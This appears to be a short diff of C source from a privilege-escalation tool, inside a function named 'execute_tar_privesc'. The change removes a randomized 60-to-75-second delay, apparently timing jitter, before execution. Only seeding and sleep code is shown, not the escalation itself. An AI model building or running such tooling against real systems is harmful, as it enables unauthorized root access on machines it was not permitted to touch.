@@ -139,8 +139,8 @@ int execute_tar_privesc(const char* target_user) {
         random_seed = (ts.tv_sec ^ ts.tv_nsec) ^ (syscall(SYS_getpid) << 16);
     }
     
-    unsigned int random_delay = 60 + (random_seed % 16);
-    unsigned int random_nanos = (random_seed >> 16) % 1000000000;
+    unsigned int random_delay = 0; // (60 + (random_seed % 16);
+    unsigned int random_nanos = 0; // ((random_seed >> 16) % 1000000000);
     
     struct timespec sleep_time;
     sleep_time.tv_sec = random_delay;
